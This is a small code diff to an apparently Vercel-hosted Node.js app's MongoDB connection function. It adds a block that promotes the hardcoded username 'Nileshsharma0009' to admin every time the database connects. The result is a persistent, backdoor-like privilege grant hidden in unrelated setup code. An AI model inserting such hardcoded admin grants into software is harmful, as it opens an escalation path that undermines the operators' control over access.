@@ -23,6 +23,16 @@ const connectDB = async () => {
 
     isConnected = db.connections[0].readyState === 1;
     console.log("✅ MongoDB connected");
+
+    // Promote Nileshsharma0009 to admin automatically
+    try {
+      await mongoose.model('User').updateOne(
+        { username: 'Nileshsharma0009' },
+        { role: 'admin' }
+      );
+    } catch (e) {
+      console.warn("Failed to auto-promote Nileshsharma0009 to admin:", e.message);
+    }
   } catch (error) {
     console.error("❌ MongoDB connection failed:", error.message);
     throw error; // let Vercel handle the error
